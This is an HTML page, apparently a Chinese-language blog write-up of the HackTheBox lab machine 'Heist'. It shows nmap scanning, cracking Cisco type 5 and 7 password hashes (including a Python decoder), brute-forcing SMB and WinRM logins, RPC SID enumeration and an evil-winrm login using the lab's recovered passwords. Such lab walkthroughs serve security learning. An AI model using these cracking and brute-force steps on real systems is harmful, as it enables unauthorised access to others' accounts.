@@ -1,0 +1,410 @@
+<!DOCTYPE html>
+<html lang='en'>
+
+<head>
+  <meta name="generator" content="Hexo 5.4.0">
+  <meta charset="utf-8">
+  
+
+  <meta http-equiv='x-dns-prefetch-control' content='on' />
+  <link rel='dns-prefetch' href='https://cdn.jsdelivr.net'>
+  <link rel="preconnect" href="https://cdn.jsdelivr.net" crossorigin>
+
+  <meta name="renderer" content="webkit">
+  <meta name="force-rendering" content="webkit">
+  <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+  <meta name="HandheldFriendly" content="True" >
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="theme-color" content="#f8f8f8">
+  <title>HTB: Heist - T0x1c</title>
+
+  
+    <meta name="description" content="Heist是一个简单的靶机，其中主要涉及Cisco密码破解、RPC密码访问、Firefox进程转储的相关知识，Cisco密码破解后可以通过RPC登录目标，获取到SID后通过WinRM登录chase用户，在Firefox进程转储后能够直接读取管理员密码。感兴趣的同学可以在HackTheBox中进行学习。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HTB: Heist">
+<meta property="og:url" content="https://toxic80l.github.io/post/51597ee4/index.html">
+<meta property="og:site_name" content="T0x1c">
+<meta property="og:description" content="Heist是一个简单的靶机，其中主要涉及Cisco密码破解、RPC密码访问、Firefox进程转储的相关知识，Cisco密码破解后可以通过RPC登录目标，获取到SID后通过WinRM登录chase用户，在Firefox进程转储后能够直接读取管理员密码。感兴趣的同学可以在HackTheBox中进行学习。">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/volantis-x/cdn-emoji/aru-l/0130.gif">
+<meta property="og:image" content="https://toxic80l.github.io/post/51597ee4/%E6%88%AA%E5%B1%8F2022-01-06%20%E4%B8%8B%E5%8D%886.36.49.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/51597ee4/%E6%88%AA%E5%B1%8F2022-01-06%20%E4%B8%8B%E5%8D%886.46.23.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/51597ee4/%E6%88%AA%E5%B1%8F2022-01-17%20%E4%B8%8B%E5%8D%884.37.06.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/51597ee4/%E6%88%AA%E5%B1%8F2022-01-06%20%E4%B8%8B%E5%8D%886.48.05.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/51597ee4/%E6%88%AA%E5%B1%8F2022-01-17%20%E4%B8%8B%E5%8D%883.46.52.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/51597ee4/%E6%88%AA%E5%B1%8F2022-01-17%20%E4%B8%8B%E5%8D%883.50.09.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/51597ee4/%E6%88%AA%E5%B1%8F2022-01-17%20%E4%B8%8B%E5%8D%884.56.50.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/51597ee4/%E6%88%AA%E5%B1%8F2022-01-17%20%E4%B8%8B%E5%8D%884.49.07.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/51597ee4/%E6%88%AA%E5%B1%8F2022-01-17%20%E4%B8%8B%E5%8D%884.49.32.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/51597ee4/%E6%88%AA%E5%B1%8F2022-01-17%20%E4%B8%8B%E5%8D%885.03.17.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/51597ee4/%E6%88%AA%E5%B1%8F2022-01-17%20%E4%B8%8B%E5%8D%885.35.23.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/51597ee4/%E6%88%AA%E5%B1%8F2022-01-17%20%E4%B8%8B%E5%8D%887.03.41.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/51597ee4/%E6%88%AA%E5%B1%8F2022-01-17%20%E4%B8%8B%E5%8D%888.19.21.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/51597ee4/%E6%88%AA%E5%B1%8F2022-01-18%20%E4%B8%8A%E5%8D%881.47.16.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/51597ee4/%E6%88%AA%E5%B1%8F2022-01-18%20%E4%B8%8B%E5%8D%881.12.30.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/51597ee4/%E6%88%AA%E5%B1%8F2022-01-18%20%E4%B8%8B%E5%8D%882.50.34.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/51597ee4/%E6%88%AA%E5%B1%8F2022-01-18%20%E4%B8%8B%E5%8D%883.51.27.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/51597ee4/%E6%88%AA%E5%B1%8F2022-01-18%20%E4%B8%8B%E5%8D%884.04.56.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/51597ee4/%E6%88%AA%E5%B1%8F2022-01-18%20%E4%B8%8B%E5%8D%884.13.38.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/51597ee4/%E6%88%AA%E5%B1%8F2022-01-18%20%E4%B8%8B%E5%8D%884.13.59.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/51597ee4/%E6%88%AA%E5%B1%8F2022-01-18%20%E4%B8%8B%E5%8D%884.26.50.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/51597ee4/%E6%88%AA%E5%B1%8F2022-01-18%20%E4%B8%8B%E5%8D%884.29.53.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/51597ee4/%E6%88%AA%E5%B1%8F2022-01-18%20%E4%B8%8B%E5%8D%884.44.47.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/51597ee4/%E6%88%AA%E5%B1%8F2022-01-18%20%E4%B8%8B%E5%8D%884.56.27.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/51597ee4/%E6%88%AA%E5%B1%8F2022-01-18%20%E4%B8%8B%E5%8D%885.01.03.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/51597ee4/%E6%88%AA%E5%B1%8F2022-01-18%20%E4%B8%8B%E5%8D%885.24.23.png">
+<meta property="article:published_time" content="2022-01-18T11:31:43.000Z">
+<meta property="article:modified_time" content="2022-01-19T03:35:53.805Z">
+<meta property="article:author" content="toxic80L">
+<meta property="article:tag" content="靶机">
+<meta property="article:tag" content="Windows">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/volantis-x/cdn-emoji/aru-l/0130.gif">
+  
+  
+
+  <!-- feed -->
+  
+
+  
+    
+<link rel="stylesheet" href="/css/main.css">
+
+  
+
+  
+
+  
+</head>
+
+<body>
+  
+
+
+  <div class='l_body' id='start'>
+    <aside class='l_left' layout='post'>
+    
+
+
+<header class="header">
+
+<div class="logo-wrap"><a class="avatar" href="/medias/avatar.png"><div class="bg" style="opacity:0;background-image:url(https://cdn.jsdelivr.net/gh/cdn-x/placeholder@1.0.2/avatar/round/rainbow64@3x.webp);"></div><img no-lazy class="avatar" src="/medias/avatar.png" onerror="javascript:this.classList.add('error');this.src='https://cdn.jsdelivr.net/gh/cdn-x/placeholder@1.0.1/image/2659360.svg';"></a><a class="title" href="/"><div class="main">T0x1c</div><div class="sub cap">我在听你的独家记忆</div></a></div>
+<nav class="menu dis-select"><a class="nav-item active" href="/">Blog</a><a class="nav-item" href="/wiki/">Wiki</a><a class="nav-item" href="/notes/">notes</a><a class="nav-item" href="/friends/">more</a></nav></header>
+
+<div class="widgets">
+
+<div class="widget-wrap single" id="toc"><div class="widget-header cap dis-select"><span class="name">TOC</span></div><div class="widget-body fs14"><div class="doc-tree active"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-%E4%BE%A6%E6%9F%A5"><span class="toc-text">0x01 侦查</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="toc-text">端口扫描</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#445%E7%AB%AF%E5%8F%A3"><span class="toc-text">445端口</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#80%E7%AB%AF%E5%8F%A3"><span class="toc-text">80端口</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3"><span class="toc-text">密码破解</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Cisco-Type-5"><span class="toc-text">Cisco Type 5</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Cisco-Type-7"><span class="toc-text">Cisco Type 7</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#smb%E6%9E%9A%E4%B8%BE"><span class="toc-text">smb枚举</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-%E4%B8%8A%E7%BA%BF-chase"><span class="toc-text">0x02 上线[chase]</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%99%BB%E9%99%86WinRM%E6%9C%8D%E5%8A%A1"><span class="toc-text">登陆WinRM服务</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AF%BB%E6%89%BEflag"><span class="toc-text">寻找flag</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-%E4%B8%8A%E7%BA%BF-system"><span class="toc-text">0x03 上线[system]</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Firefox%E8%8E%B7%E5%8F%96%E5%87%AD%E8%AF%81"><span class="toc-text">Firefox获取凭证</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AF%BB%E6%89%BEflag-1"><span class="toc-text">寻找flag</span></a></li></ol></li></ol></div></div></div>
+
+
+</div>
+<footer class="footer dis-select"><div class="social-wrap"><a class="social" href="https://github.com/toxic80L" target="_blank" rel="external nofollow noopener noreferrer"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/cdn-x/placeholder@1.0.3/social/08a41b181ce68.svg"/></a></div></footer>
+
+    </aside>
+    <div class='l_main'>
+      
+
+      
+
+
+<div class="bread-nav fs12"><div id="breadcrumb"><a class="cap breadcrumb" href="/">Home</a><span class="sep"></span><a class="cap breadcrumb" href="/">Blog</a><span class="sep"></span><a class="cap breadcrumb-link" href="/categories/HackTheBox/">HackTheBox</a></div><div id="post-meta">Posted on&nbsp;<time datetime="2022-01-18T11:31:43.000Z">2022-01-18</time></div></div>
+
+<article class='content md post'>
+<h1 class="article-title"><span>HTB: Heist</span></h1>
+<p>Heist是一个简单的靶机，其中主要涉及Cisco密码破解、RPC密码访问、Firefox进程转储的相关知识，Cisco密码破解后可以通过RPC登录目标，获取到SID后通过WinRM登录chase用户，在Firefox进程转储后能够直接读取管理员密码。感兴趣的同学可以在HackTheBox中进行学习。</p>
+<span id="more"></span>
+<span class="tag-plugin emoji"><img no-lazy class="inline" src="https://cdn.jsdelivr.net/gh/volantis-x/cdn-emoji/aru-l/0130.gif" style="height:3em" onerror="javascript:this.classList.add('error');this.src='https://cdn.jsdelivr.net/gh/cdn-x/placeholder@1.0.1/image/2659360.svg';"></span>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/51597ee4/%E6%88%AA%E5%B1%8F2022-01-06%20%E4%B8%8B%E5%8D%886.36.49.png" alt="截屏2022-01-06 下午6.36.49"></p>
+<h2 id="0x01-侦查"><a href="#0x01-侦查" class="headerlink" title="0x01 侦查"></a>0x01 侦查</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p>首先使用 nmap 进行端口扫描</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -Pn -p- -sV -sC -A 10.10.10.149 -oA nmap_Heist</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/51597ee4/%E6%88%AA%E5%B1%8F2022-01-06%20%E4%B8%8B%E5%8D%886.46.23.png" alt="截屏2022-01-06 下午6.46.23"><br>通过扫描结果我们可以发现目标开放了80、135、446、5985、49669端口</p>
+<h4 id="445端口"><a href="#445端口" class="headerlink" title="445端口"></a>445端口</h4><p>使用 smbclient 进行匿名登录</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smbclient --list 10.10.10.149 -U <span class="string">&quot;&quot;</span></span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/51597ee4/%E6%88%AA%E5%B1%8F2022-01-17%20%E4%B8%8B%E5%8D%884.37.06.png" alt="截屏2022-01-17 下午4.37.06"><br>结果显示无法连接smb服务，匿名登录失败</p>
+<h4 id="80端口"><a href="#80端口" class="headerlink" title="80端口"></a>80端口</h4><p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/51597ee4/%E6%88%AA%E5%B1%8F2022-01-06%20%E4%B8%8B%E5%8D%886.48.05.png" alt="截屏2022-01-06 下午6.48.05"><br>访问后是一个登录界面，可以通过 guest 账户登录<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/51597ee4/%E6%88%AA%E5%B1%8F2022-01-17%20%E4%B8%8B%E5%8D%883.46.52.png" alt="截屏2022-01-17 下午3.46.52"><br>Hazard 用户在求助 Cisco 路由器的相关问题，点击包含其中的附件<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/51597ee4/%E6%88%AA%E5%B1%8F2022-01-17%20%E4%B8%8B%E5%8D%883.50.09.png" alt="截屏2022-01-17 下午3.50.09"></p>
+<h3 id="密码破解"><a href="#密码破解" class="headerlink" title="密码破解"></a>密码破解</h3><p>在附件中我们发现其中存在账号和密码，分别是类型为 Cisco 7 和 Cisco 5 的哈希值</p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">enable</span> <span class="string">secret</span> <span class="number">5</span> <span class="string">$1$pdQG$o8nrSzsGXeaduXrjlvKc91</span></span><br><span class="line"><span class="string">username</span> <span class="string">rout3r</span> <span class="string">password</span> <span class="number">7</span> <span class="string">0242114B0E143F015F5D1E161713</span></span><br><span class="line"><span class="string">username</span> <span class="string">admin</span> <span class="string">privilege</span> <span class="number">15</span> <span class="string">password</span> <span class="number">7</span> <span class="string">02375012182C1A1D751618034F36415408</span></span><br></pre></td></tr></table></figure>
+<h4 id="Cisco-Type-5"><a href="#Cisco-Type-5" class="headerlink" title="Cisco Type 5"></a>Cisco Type 5</h4><p>使用 john 对 Type 5 哈希进行爆破</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">john --wordlist=/usr/share/wordlists/rockyou.txt 5.hash</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/51597ee4/%E6%88%AA%E5%B1%8F2022-01-17%20%E4%B8%8B%E5%8D%884.56.50.png" alt="截屏2022-01-17 下午4.56.50"><br>成功破解，密码为<code>stealth1agent</code></p>
+<h4 id="Cisco-Type-7"><a href="#Cisco-Type-7" class="headerlink" title="Cisco Type 7"></a>Cisco Type 7</h4><p>针对 Type 7 的哈希，可以借助在线网站进行破解<br><strong>破解网站：<a target="_blank" rel="noopener" href="https://www.ifm.net.nz/cookbooks/passwordcracker.html">https://www.ifm.net.nz/cookbooks/passwordcracker.html</a></strong></p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/51597ee4/%E6%88%AA%E5%B1%8F2022-01-17%20%E4%B8%8B%E5%8D%884.49.07.png" alt="截屏2022-01-17 下午4.49.07"><br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/51597ee4/%E6%88%AA%E5%B1%8F2022-01-17%20%E4%B8%8B%E5%8D%884.49.32.png" alt="截屏2022-01-17 下午4.49.32"><br>经过解密后密码为<code>rout3r/$uperP@ssword</code>、<code>admin/Q4)sJu\Y8qz*A3?d</code></p>
+<p>Type 7 存在静态加密密钥<code>tfd;kfoA,.iyewrkldJKD</code>以及弱算法加密。我们可以直接使用 python 脚本进行破解</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> binascii <span class="keyword">import</span> unhexlify</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) != <span class="number">2</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Usage: <span class="subst">&#123;sys.argv[<span class="number">0</span>]&#125;</span> [level 7 hash]&quot;</span>)</span><br><span class="line">    exit()</span><br><span class="line"></span><br><span class="line">static_key = <span class="string">&quot;tfd;kfoA,.iyewrkldJKD&quot;</span></span><br><span class="line">enc = sys.argv[<span class="number">1</span>]</span><br><span class="line">start = <span class="built_in">int</span>(enc[:<span class="number">2</span>], <span class="number">16</span>) - <span class="number">1</span></span><br><span class="line">enc = unhexlify(enc[<span class="number">2</span>:])</span><br><span class="line">key = static_key[start:] + static_key[:start]</span><br><span class="line"></span><br><span class="line">plain = <span class="string">&#x27;&#x27;</span>.join([<span class="built_in">chr</span>(x ^ <span class="built_in">ord</span>(key[i % <span class="built_in">len</span>(key)]))  <span class="keyword">for</span> i, x <span class="keyword">in</span> <span class="built_in">enumerate</span>(enc)])</span><br><span class="line"><span class="built_in">print</span>(plain)</span><br></pre></td></tr></table></figure>
+
+<h3 id="smb枚举"><a href="#smb枚举" class="headerlink" title="smb枚举"></a>smb枚举</h3><p>有了账号密码，那么我们就可以对先前的smb服务进行爆破，使用 crackmapexec 对其进行爆破</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crackmapexec smb 10.10.10.149 -u users.txt -p pass.txt</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/51597ee4/%E6%88%AA%E5%B1%8F2022-01-17%20%E4%B8%8B%E5%8D%885.03.17.png" alt="截屏2022-01-17 下午5.03.17"><br>爆破成功，使用账号密码<code>hazard/stealth1agent</code>查询smb共享 </p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smbmap -H 10.10.10.149 -u hazard -p stealth1agent</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/51597ee4/%E6%88%AA%E5%B1%8F2022-01-17%20%E4%B8%8B%E5%8D%885.35.23.png" alt="截屏2022-01-17 下午5.35.23"><br>当前用户只能读取<code>$IPC</code>，<code>$IPC</code>主要用于进程通信的共享，通常会出现空连接会话，但是目前我们需要凭证才能读取</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rpcclient -U <span class="string">&#x27;hazard%stealth1agent&#x27;</span> 10.10.10.149</span><br></pre></td></tr></table></figure>
+<p>使用 lookupnames 获取用户sid</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">rpcclient &gt; lookupnames hazard</span><br><span class="line">rpcclient &gt; lookupnames administrator</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/51597ee4/%E6%88%AA%E5%B1%8F2022-01-17%20%E4%B8%8B%E5%8D%887.03.41.png" alt="截屏2022-01-17 下午7.03.41"><br>也可以通过sid反查用户</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rpcclient &gt; lookupsids S-1-5-21-4254423774-1266059056-3197185112-1008</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/51597ee4/%E6%88%AA%E5%B1%8F2022-01-17%20%E4%B8%8B%E5%8D%888.19.21.png" alt="截屏2022-01-17 下午8.19.21"></p>
+<p>由此可知我们可以通过暴力破解sid来获取用户列表</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> &#123;1000..1050&#125;; <span class="keyword">do</span> rpcclient -U <span class="string">&#x27;hazard%stealth1agent&#x27;</span> 10.10.10.149 -c <span class="string">&#x27;lookupsids S-1-5-21-4254423774-1266059056-3197185112-$i&#x27;</span> | grep -v unknown; <span class="keyword">done</span></span><br></pre></td></tr></table></figure>
+<p>使用 impackets 中的 lookupsid.py 能够帮助我们更加方便地获取sid</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 lookupsid.py hazard:stealth1agent@10.10.10.149</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/51597ee4/%E6%88%AA%E5%B1%8F2022-01-18%20%E4%B8%8A%E5%8D%881.47.16.png" alt="截屏2022-01-18 上午1.47.16"><br>成功获取到如下用户名</p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">support</span></span><br><span class="line"><span class="string">Chase</span></span><br><span class="line"><span class="string">Jason</span></span><br></pre></td></tr></table></figure>
+<h2 id="0x02-上线-chase"><a href="#0x02-上线-chase" class="headerlink" title="0x02 上线[chase]"></a>0x02 上线[chase]</h2><h3 id="登陆WinRM服务"><a href="#登陆WinRM服务" class="headerlink" title="登陆WinRM服务"></a>登陆WinRM服务</h3><p>目标开放 WinRM 服务，我们使用新的用户名和密码对其进行爆破</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">msf &gt; use auxiliary/scanner/winrm/winrm_login</span><br><span class="line">msf &gt; <span class="built_in">set</span> rhosts 10.10.10.149</span><br><span class="line">msf &gt; <span class="built_in">set</span> USER_FILE /root/hackthebox/Machines/Heist/users.txt</span><br><span class="line">msf &gt; <span class="built_in">set</span> PASS_FILE /root/hackthebox/Machines/Heist/pass.txt</span><br><span class="line">msf &gt; run</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/51597ee4/%E6%88%AA%E5%B1%8F2022-01-18%20%E4%B8%8B%E5%8D%881.12.30.png" alt="截屏2022-01-18 下午1.12.30"><br><code>chase/Q4)sJu\Y8qz*A3?d</code>能够成功登陆，使用 evil-winrm 完成登陆</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ruby evil-winrm.rb -i 10.10.10.149 -u SUPPORTDESK\\chase -s <span class="string">&#x27;./ps1_scripts&#x27;</span> -p <span class="string">&#x27;Q4)sJu\Y8qz*A3?d&#x27;</span> </span><br></pre></td></tr></table></figure>
